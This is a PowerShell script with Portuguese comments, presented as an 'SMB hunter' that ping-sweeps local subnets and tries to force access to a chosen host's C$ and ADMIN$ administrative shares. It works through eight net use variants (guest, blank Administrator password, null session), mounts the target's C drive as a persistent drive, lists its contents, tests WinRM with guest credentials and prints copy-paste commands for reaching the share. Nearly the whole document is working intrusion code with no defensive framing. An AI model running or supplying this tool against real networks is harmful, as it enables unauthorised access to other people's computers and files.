# ========================================
# SCRIPT SMB AVANÇADO - FORÇA ACESSO C$
# Funciona mesmo com Guest desabilitado
# ========================================

param(
    [string[]]$Networks = @("192.168.1.0/24", "192.168.0.0/24", "10.0.0.0/24"),
    [string]$GuestUser = "guest",
    [string]$GuestPass = ""
)

Write-Host "🔥 SMB HUNTER - FORÇA C$ ACCESS" -ForegroundColor Cyan
Write-Host "Redes: $($Networks -join ' | ')" -ForegroundColor Yellow

# 1. SCAN HOSTS
$allHosts = @()
foreach($network in $Networks) {
    Write-Host "`n🔍 $network" -ForegroundColor Green
    $ipBase = ($network -split '\.')[0..2] -join '.'
    1..254 | ForEach {
        $ip = "$ipBase.$_"
        if(Test-Connection $ip -Count 1 -Quiet -ea 0) {
            $allHosts += $ip
            Write-Host "  ✓ $ip" -ForegroundColor Green
        }
    }
}

if($allHosts.Count -eq 0) { Write-Host "❌ No hosts"; exit }

# 2. MENU
Write-Host "`n📋 Hosts ($($allHosts.Count)):" -ForegroundColor Yellow
for($i=0; $i -lt $allHosts.Count; $i++) {
    Write-Host "  $($i+1). $($allHosts[$i])"
}

$choice = Read-Host "`nNúmero: "
$targetIP = $allHosts[[int]$choice - 1]
Write-Host "`n🎯 $targetIP" -ForegroundColor Cyan

# ========================================
# SMB - 8 MÉTODOS DIFERENTES (um vai funcionar!)
# ========================================
Write-Host "`n" + "="*60 -ForegroundColor Red
Write-Host "💾 FORÇANDO ACESSO \\\\$targetIP\C$" -ForegroundColor Red

$methods = @()

# MÉTODO 1: net use básico
$methods += @{
    Name = "net use (básico)"
    Cmd = "net use \\\\$targetIP\IPC$ /user:$GuestUser `"$GuestPass`" /persistent:no"
}

# MÉTODO 2: net use sem senha
$methods += @{
    Name = "net use (vazio)"
    Cmd = "net use \\\\$targetIP\IPC$ /user:$GuestUser /persistent:no"
}

# MÉTODO 3: Administrator comum
$methods += @{
    Name = "Administrator"
    Cmd = 'net use "\\{0}\IPC$" /user:Administrator "" /persistent:no' -f $targetIP
}

# MÉTODO 4: Guest alternativo
$methods += @{
    Name = "Guest IPC"
    Cmd = 'net use "\\{0}\IPC$" "" /persistent:no' -f $targetIP
}

# MÉTODO 5: Null session
$methods += @{
    Name = "Null Session"
    Cmd = 'net use "\\{0}\IPC$" /user:"" "" /persistent:no' -f $targetIP
}

# MÉTODO 6: COM+
$methods += @{
    Name = "COM+ (admin$)"
    Cmd = 'net use "\\{0}\ADMIN$" /user:$GuestUser' -f $targetIP
}

# MÉTODO 7: IPC sem credenciais
$methods += @{
    Name = "IPC Direto"
    Cmd = 'net use "\\{0}\IPC$" /persistent:no' -f $targetIP
}

# MÉTODO 8: Força C$ direto
$methods += @{
    Name = "C$ Direto"
    Cmd = 'net use "\\{0}\C$" /user:$GuestUser ""' -f $targetIP
}

# TESTA TODOS OS MÉTODOS
foreach($method in $methods) {
    Write-Host "`n🧪 $($method.Name):" -ForegroundColor Yellow -NoNewline
    
    try {
        Invoke-Expression $method.Cmd 2>&1 | Out-Null
        if(Test-Path "\\$targetIP\IPC$") {
            Write-Host " ✅ CONECTADO!" -ForegroundColor Green
            Write-Host "   └─ Comando: $($method.Cmd)" -ForegroundColor Gray
            
            # TESTA C$
            if(Test-Path "\\$targetIP\C$") {
                Write-Host "   🎉 C$ ACESSÍVEL!" -ForegroundColor Green
                Write-Host "   Conteúdo:" -ForegroundColor Cyan
                Get-ChildItem "\\$targetIP\C$" | Select -First 10 | Format-Table
                
                # Monta DRIVE
                try {
                    New-PSDrive -Name "TARGET" -PSProvider FileSystem -Root "\\$targetIP\C$" -Persist
                    Write-Host "`n💾 DRIVE TARGET: Montado!" -ForegroundColor Green
                    Write-Host "   ls TARGET:"; ls TARGET:\
                } catch { }
                
                Read-Host "`n🎊 ACESSO TOTAL! Enter para continuar..."
                break
            }
        } else {
            Write-Host " ❌" -ForegroundColor Red
            net use "\\$targetIP\*" /delete /y 2>$null
        }
    } catch {
        Write-Host " ❌" -ForegroundColor Red
    }
    Start-Sleep 1
}

# ========================================
# WINRM (bônus)
# ========================================
Write-Host "`n🔹 WINRM Teste Rápido:" -ForegroundColor Blue
try {
    $cred = New-Object PSCredential($GuestUser, (ConvertTo-SecureString $GuestPass -AsPlainText -Force))
    $session = New-PSSession -ComputerName $targetIP -Credential $cred -ea Stop
    Write-Host "✅ WINRM OK!" -ForegroundColor Green
    Invoke-Command -Session $session -ScriptBlock { whoami; hostname }
    Remove-PSSession $session
} catch {
    Write-Host "❌ WINRM: $_" -ForegroundColor Red
}

# ========================================
# COMANDOS PRONTOS PARA 192.168.0.137
# ========================================
Write-Host "`n" + "="*60 -ForegroundColor Cyan
Write-Host "📝 COPY-PASTE PARA $targetIP :" -ForegroundColor Cyan
@"
# SMB C$
net use "\\$targetIP\C$" /user:guest ""

# IPC Enumeração
net use "\\$targetIP\IPC$" /user:"" ""
dir "\\$targetIP\IPC$"

# Explorer
explorer "\\$targetIP\C$\"

# PowerShell Drive
New-PSDrive -Name X -PSProvider FileSystem -Root "\\$targetIP\C$"
"@ | ForEach { Write-Host "   $_" }

# Verifica serviços SMB
Write-Host "`n🔍 SERVIÇOS SMB no alvo:" -ForegroundColor Magenta
Test-NetConnection $targetIP -Port 445 -InformationLevel Quiet

Read-Host "`n✅ PRONTO!"
